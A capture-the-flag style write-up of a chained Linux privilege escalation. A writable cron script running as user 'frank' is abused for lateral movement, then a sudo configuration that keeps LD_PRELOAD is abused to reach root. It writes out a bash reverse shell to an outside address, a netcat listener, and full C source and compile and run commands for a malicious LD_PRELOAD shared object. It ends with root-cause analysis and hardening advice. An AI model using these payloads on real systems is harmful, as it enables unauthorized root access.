## **1. Overview**
This machine presented a chained privilege escalation path involving:

- A misconfigured scheduled task (cron job) running under another unprivileged user  
- A writable script executed periodically  
- A second escalation vector leveraging insecure environment variable handling in `sudo`  
- Abuse of `LD_PRELOAD` due to overly permissive `env_keep` configuration  

The machine effectively demonstrated how multiple small misconfigurations can combine into a full compromise.

---

## **2. Enumeration**
Initial enumeration focused on common privilege escalation vectors:

- SUID binaries  
- Writable system binaries  
- Misconfigured capabilities  
- Excessive `sudo` privileges  
- Cron jobs and scheduled tasks  

No meaningful findings appeared in the standard `/etc/crontab` file.  
However, deeper inspection of `/etc/cron.d/` revealed a **custom scheduled task** running under the user **frank**.

### **Key Finding: Over‑Permissive Cron Script**
A script inside `/etc/cron.d/` was:

- Executed periodically  
- Run as user **frank**  
- **World‑writable**, allowing modification by any local user  

This represents a classic privilege escalation flaw:  
A scheduled task running with higher privileges but referencing a script that unprivileged users can modify.

---

## **3. Stage 1 — Lateral Movement to User “frank”**
Because the cron script was writable, it allowed the insertion of arbitrary commands.  
Once the scheduled task executed, the machine ran the modified script under the **frank** account, granting access to that user.
I simply appended a reverse shell to my machone "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" and ran a simple netcat listner wrapped with rlwrap "rlwrap nc -lvnp 4444"
and in a minute a recieve a reverse shell.

This step demonstrates a common real‑world issue:  
**Privileged automation relying on insecure file permissions.**

---

## **4. Stage 2 — Privilege Escalation to Root**
With access to **frank**, the next step was to evaluate privilege boundaries from that account.

### **Key Finding: Misconfigured `sudo` Environment Handling**
Running `sudo -l` revealed:

- The user could run a specific command via `sudo`  
- The `env_keep` option was enabled  
- The environment variable **`LD_PRELOAD`** was not sanitized  
#steps:
    1. i crafted a binary in c language here is its content:
#include <unistd.h>                                                                                                                                                           #include <stdio.h>                                                                                                                                                                             
#include <sys/types.h>
#include <stdlib.h> 
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0); system("/bin/bash");
}                                                      
  2. i compliled the code as a shared object (.so extention)
    "gcc binary.c -o binary.so -shared -nostartfiles"
  3. i ran the command i have sudo permissions with + the LD_PRELOAD variable pointing to the shared object we made 
    "sudo LD_PRELOAD=/tmp/binary.so id"
    and this immediately gave me root access

### **Why This Is Dangerous**
`LD_PRELOAD` allows a user to force a program to load a custom shared library before any others.  
If `sudo` does not strip this variable, a user can cause a root‑executed binary to load attacker‑controlled code.

---

## **5. Root Cause Analysis**
### **Misconfiguration #1 — Writable Cron Script**
- Privileged scheduled tasks must never reference files writable by unprivileged users.  
- This allowed lateral movement into another user account.

### **Misconfiguration #2 — Unsafe `sudo` Environment Handling**
- `env_keep` should not include variables affecting dynamic linking.  
- `LD_PRELOAD` must always be stripped by `sudo`.  
- This allowed escalation from frank → root.

### **Misconfiguration #3 — Lack of Least Privilege**
- The command allowed via `sudo` did not require elevated privileges.  
- Unnecessary privilege exposure increases attack surface.

---

## **6. Mitigation Recommendations**
### **For Cron Jobs**
- Ensure scripts executed by cron are owned by root and not writable by other users.  
- Use strict permissions: `600` or `700`.  
- Avoid running cron tasks as unprivileged users unless necessary.

### **For `sudo` Configuration**
- Remove `LD_PRELOAD` and similar variables from `env_keep`.  
- Avoid granting `sudo` access to binaries that do not require elevation.  
- Use `secure_path` to enforce controlled execution paths.

### **For System Hardening**
- Regularly audit file permissions in `/etc/cron.*`  
- Monitor for unexpected writable files in privileged directories  
- Enforce principle of least privilege across automation and scheduled tasks  

---

## **7. Lessons Learned**
This machine highlights several important privilege escalation principles:

- **Automation is dangerous when paired with weak file permissions.**  
- **Environment variables can be as dangerous as SUID binaries when mishandled.**  
- **Privilege escalation often requires chaining multiple small weaknesses.**  
- **Lateral movement is not only a network concept — it applies within a single host.**  

---

## **8. Conclusion**
The machine provided a realistic demonstration of how:

1. A writable cron script enabled movement into another user account  
2. A misconfigured `sudo` environment allowed escalation to root  

Both issues are common in real environments, especially in legacy systems or poorly audited automation setups.  
The exploitation path reinforces the importance of secure file permissions, strict environment sanitization, and least‑privilege design.
